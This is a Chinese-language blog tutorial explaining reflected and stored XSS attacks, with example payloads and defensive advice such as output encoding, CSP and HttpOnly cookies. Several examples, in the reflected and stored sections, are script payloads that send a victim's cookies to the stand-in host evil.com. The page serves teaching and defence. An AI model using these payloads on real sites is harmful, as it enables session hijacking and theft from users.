<!DOCTYPE html>
<html lang="en">
<head>
  
    
    <title>XSS Attack :: 为霜的博客</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="1. XSS 攻击 XSS（Cross-Site Scripting, 跨站脚本攻击）是一种常见的 Web 安全漏洞, 攻击者通过在网页中注入恶意脚本代码, 当其他用户浏览该页面时, 这些恶意脚本会在用户的浏览器中执行, 从而实现窃取用户信息、会话劫持等攻击目的,
1.1. 反射型 XSS (Reflected XSS) 反射型 XSS 是一种非持久性跨站脚本攻击, 攻击者通过诱导用户点击包含恶意脚本的链接, 将恶意代码注入到目标网站的页面中, 恶意脚本通过用户的请求（通常是 URL 参数）被“反射”到服务器的响应中, 并在用户的浏览器中执行,
攻击者构造一个包含恶意脚本的 URL（通常通过 GET 参数传递） 用户被诱导点击该 URL（例如通过钓鱼邮件或社交工程） 服务器接收到请求后，未经充分过滤或转义就将用户输入（包含恶意脚本）直接嵌入到响应页面中 浏览器收到响应后，执行页面中的恶意脚本，导致攻击生效 假设有一个简单的搜索网站 example.com, 用户可以在页面上输入搜索关键词, 服务器会将关键词显示在结果页面上, 例如, 用户输入 apple, URL 会变成 http://example.com/search?q=apple:
结果页面会显示:
您搜索了：apple 如果服务器没有对用户输入 q 参数进行过滤或转义, 攻击者可以构造一个恶意 URL:
http://example.com/search?q=&lt;script&gt;alert(&#39;Hacked!&#39;);&lt;/script&gt; 当用户点击这个链接时，服务器会将 &lt;script&gt;alert(&#39;Hacked!&#39;);&lt;/script&gt; 直接嵌入到响应页面中，生成如下 HTML:
&lt;div&gt; 您搜索了：&lt;script&gt;alert(&#39;Hacked!&#39;);&lt;/script&gt; &lt;/div&gt; 用户的浏览器会解析并执行这个脚本，弹出一个提示框显示 Hacked!
攻击者可能不仅仅是弹窗, 而是窃取用户的 Cookie 或重定向到恶意网站, 例如, 构造如下 URL:
http://example.com/search?q=&lt;script&gt;document.location=&#39;http://evil.com/steal?cookie=&#39;&#43;document.cookie;&lt;/script&gt; 当用户点击后，浏览器会执行脚本，将用户的 Cookie 发送到攻击者的服务器 evil.com
" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://blog.jiyi27.com/posts/networking/009-xss-attack/" />





  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/categories.min.3202f75cbb294747099af3850a68a09ee94b3ce505fc39e134692d90ff0a9b2a.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/code.min.dd73d157e77e82a3dc1cb06ba424cf6cc6811af0bb604ad6c68e70faf2439c8a.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/main.min.3fb8954e26342ad3afabb4525959bfec6f9fc0d6929f0dda738ddeee30211690.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/menu.min.8cee75f73b9f9b1e40bd0dd53e6e770156b08bbfe1c579cd256c3f6cd3b6d32b.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/post.min.014a50745fbdd41d5f420a3e288730d5af4b7d90344dc6211d0e50c368b5b303.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/prism.min.b958d3d7c6c67361b945f9062d07d403422604b3d2cd33f93b88d41ed0ba634d.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/term.min.94de320c1b850e126e6d2c88a7c90acf58bb1313f0ea14a14cda2a42f2a88db2.css">

  
  <link rel="stylesheet" href="https://blog.jiyi27.com/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">


<link rel="stylesheet" href="https://blog.jiyi27.com/terminal.css">




<link rel="shortcut icon" href="https://blog.jiyi27.com/favicon.png">
<link rel="apple-touch-icon" href="https://blog.jiyi27.com/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="XSS Attack">
<meta property="og:description" content="1. XSS 攻击 XSS（Cross-Site Scripting, 跨站脚本攻击）是一种常见的 Web 安全漏洞, 攻击者通过在网页中注入恶意脚本代码, 当其他用户浏览该页面时, 这些恶意脚本会在用户的浏览器中执行, 从而实现窃取用户信息、会话劫持等攻击目的,
1.1. 反射型 XSS (Reflected XSS) 反射型 XSS 是一种非持久性跨站脚本攻击, 攻击者通过诱导用户点击包含恶意脚本的链接, 将恶意代码注入到目标网站的页面中, 恶意脚本通过用户的请求（通常是 URL 参数）被“反射”到服务器的响应中, 并在用户的浏览器中执行,
攻击者构造一个包含恶意脚本的 URL（通常通过 GET 参数传递） 用户被诱导点击该 URL（例如通过钓鱼邮件或社交工程） 服务器接收到请求后，未经充分过滤或转义就将用户输入（包含恶意脚本）直接嵌入到响应页面中 浏览器收到响应后，执行页面中的恶意脚本，导致攻击生效 假设有一个简单的搜索网站 example.com, 用户可以在页面上输入搜索关键词, 服务器会将关键词显示在结果页面上, 例如, 用户输入 apple, URL 会变成 http://example.com/search?q=apple:
结果页面会显示:
您搜索了：apple 如果服务器没有对用户输入 q 参数进行过滤或转义, 攻击者可以构造一个恶意 URL:
http://example.com/search?q=&lt;script&gt;alert(&#39;Hacked!&#39;);&lt;/script&gt; 当用户点击这个链接时，服务器会将 &lt;script&gt;alert(&#39;Hacked!&#39;);&lt;/script&gt; 直接嵌入到响应页面中，生成如下 HTML:
&lt;div&gt; 您搜索了：&lt;script&gt;alert(&#39;Hacked!&#39;);&lt;/script&gt; &lt;/div&gt; 用户的浏览器会解析并执行这个脚本，弹出一个提示框显示 Hacked!
攻击者可能不仅仅是弹窗, 而是窃取用户的 Cookie 或重定向到恶意网站, 例如, 构造如下 URL:
http://example.com/search?q=&lt;script&gt;document.location=&#39;http://evil.com/steal?cookie=&#39;&#43;document.cookie;&lt;/script&gt; 当用户点击后，浏览器会执行脚本，将用户的 Cookie 发送到攻击者的服务器 evil.com
" />
<meta property="og:url" content="https://blog.jiyi27.com/posts/networking/009-xss-attack/" />
<meta property="og:site_name" content="为霜的博客" />

  <meta property="og:image" content="https://blog.jiyi27.com/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">

  <meta property="article:section" content="计算机网络" />


  <meta property="article:published_time" content="2025-04-12 23:58:57 &#43;0000 UTC" />












</head>
<body>


<div class="container center">

  
  
  

  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://blog.jiyi27.com/posts/networking/009-xss-attack/">XSS Attack</a>
  </h1>
  <div class="post-meta"><time class="post-date">2025-04-12</time><span class="post-reading-time">1 分钟阅读 (177 字数)</span></div>

  
    <span class="post-tags">
      
      #<a href="https://blog.jiyi27.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a>&nbsp;
      
      #<a href="https://blog.jiyi27.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <h2 id="1-xss-攻击">1. XSS 攻击<a href="#1-xss-攻击" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>XSS（Cross-Site Scripting, 跨站脚本攻击）是一种常见的 Web 安全漏洞, 攻击者通过在网页中注入恶意脚本代码, 当其他用户浏览该页面时, 这些恶意脚本会在用户的浏览器中执行, 从而实现窃取用户信息、会话劫持等攻击目的,</p>
<h3 id="11-反射型-xss-reflected-xss">1.1. 反射型 XSS (Reflected XSS)<a href="#11-反射型-xss-reflected-xss" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>反射型 XSS 是一种非持久性跨站脚本攻击, 攻击者通过诱导用户点击包含恶意脚本的链接, 将恶意代码注入到目标网站的页面中, 恶意脚本通过用户的请求（通常是 URL 参数）被“反射”到服务器的响应中, 并在用户的浏览器中执行,</p>
<ul>
<li>攻击者构造一个包含恶意脚本的 URL（通常通过 GET 参数传递）</li>
<li>用户被诱导点击该 URL（例如通过钓鱼邮件或社交工程）</li>
<li>服务器接收到请求后，未经充分过滤或转义就将用户输入（包含恶意脚本）直接嵌入到响应页面中</li>
<li>浏览器收到响应后，执行页面中的恶意脚本，导致攻击生效</li>
</ul>
<p>假设有一个简单的搜索网站 <code>example.com</code>, 用户可以在页面上输入搜索关键词, 服务器会将关键词显示在结果页面上, 例如, 用户输入 apple, URL 会变成 <code>http://example.com/search?q=apple</code>:</p>
<p>结果页面会显示:</p>
<pre tabindex="0"><code>您搜索了：apple
</code></pre><p>如果服务器没有对用户输入 q 参数进行过滤或转义, 攻击者可以构造一个恶意 URL:</p>
<pre tabindex="0"><code>http://example.com/search?q=&lt;script&gt;alert(&#39;Hacked!&#39;);&lt;/script&gt;
</code></pre><p>当用户点击这个链接时，服务器会将 <code>&lt;script&gt;alert('Hacked!');&lt;/script&gt;</code> 直接嵌入到响应页面中，生成如下 HTML:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>  您搜索了：&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Hacked!&#39;</span>);&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
</span></span></code></pre></div><p>用户的浏览器会解析并执行这个脚本，弹出一个提示框显示 Hacked!</p>
<p>攻击者可能不仅仅是弹窗, 而是窃取用户的 Cookie 或重定向到恶意网站, 例如, 构造如下 URL:</p>
<pre tabindex="0"><code>http://example.com/search?q=&lt;script&gt;document.location=&#39;http://evil.com/steal?cookie=&#39;+document.cookie;&lt;/script&gt;
</code></pre><p>当用户点击后，浏览器会执行脚本，将用户的 Cookie 发送到攻击者的服务器 <code>evil.com</code></p>
<p><strong>防御措施</strong></p>
<ul>
<li>对用户输入进行严格的<strong>输入验证</strong>和<strong>输出编码</strong>（例如，将 <code>&lt;</code> 编码为 <code>&amp;lt;</code>）</li>
<li>使用安全的框架（如 React 或 Angular），它们通常会自动对输出进行转义</li>
<li>启用 Content Security Policy (CSP)，限制页面加载的脚本来源</li>
<li>对 URL 参数进行过滤，拒绝包含可疑字符的请求</li>
</ul>
<h3 id="12-存储型-xss-stored-xss">1.2. 存储型 XSS (Stored XSS)<a href="#12-存储型-xss-stored-xss" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>存储型 XSS 是一种持久性跨站脚本攻击, 攻击者将恶意脚本注入到目标网站的数据库或其他存储介质中, 当其他用户访问受感染的页面时, 服务器会从存储中取出恶意脚本并将其嵌入到页面, 脚本会在用户的浏览器中执行:</p>
<ul>
<li>
<p>攻击者通过网站的输入点（如评论区、用户资料、帖子等）提交包含恶意脚本的内容</p>
</li>
<li>
<p>服务器未对输入进行充分过滤，将恶意脚本保存到数据库</p>
</li>
<li>
<p>当其他用户访问相关页面时，服务器从数据库中取出数据（包含恶意脚本），并将其嵌入到页面中</p>
</li>
<li>
<p>用户的浏览器加载页面时，执行恶意脚本</p>
</li>
</ul>
<p>假设有一个论坛网站, 用户可以在帖子中发表评论, 如果服务器没有对评论内容进行过滤, 攻击者可以在评论中输入恶意脚本, 例如, 攻击者在评论框中输入:</p>
<pre tabindex="0"><code>&lt;script&gt;alert(&#39;You are hacked!&#39;);&lt;/script&gt;
</code></pre><p>这条评论被保存到数据库中, 每当其他用户访问这个帖子时, 服务器会从数据库中取出评论内容并直接渲染到页面, 生成如下 HTML:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;comment&#34;</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;You are hacked!&#39;</span>);&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
</span></span></code></pre></div><p>所有访问该帖子的用户都会在浏览器中看到 You are hacked! 的弹窗, 攻击者可能利用存储型 XSS 进行更严重的攻击, 例如窃取用户会话或执行钓鱼攻击, 假设攻击者在评论中输入:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;http://evil.com/steal?cookie=&#39;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><p>这条评论被存储后, 任何访问该页面的用户的 Cookie 都会被发送到攻击者的服务器 evil.com, 如果网站使用 Cookie 进行身份验证, 攻击者可能窃取用户的会话, 冒充用户进行操作,</p>
<p><strong>防御措施</strong></p>
<ul>
<li>使用 HTTPOnly 和 Secure Cookie 标志, 降低 Cookie 窃取的风险</li>
<li>启用 Content Security Policy (CSP), 限制脚本执行</li>
<li>对用户输入进行严格的<strong>输入验证</strong>, 只允许安全的字符和格式</li>
</ul>

      </div></div>

  
    
<div class="pagination">
  <div class="pagination__title">
    <span class="pagination__title-h">查看其他文章</span>
    <hr />
  </div>
  <div class="pagination__buttons">
    
      <a href="https://blog.jiyi27.com/posts/networking/011-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/" class="button inline prev">
        缓存投毒
      </a>
    
    
      ::
    
    
      <a href="https://blog.jiyi27.com/posts/blogs/001-nextjs-middleware-bypass-issue/" class="button inline next">
        Next.js 中间件漏洞
      </a>
    
  </div>
</div>


  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/jiyi27/jiyi27.github.io" target="_blank">Theme</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
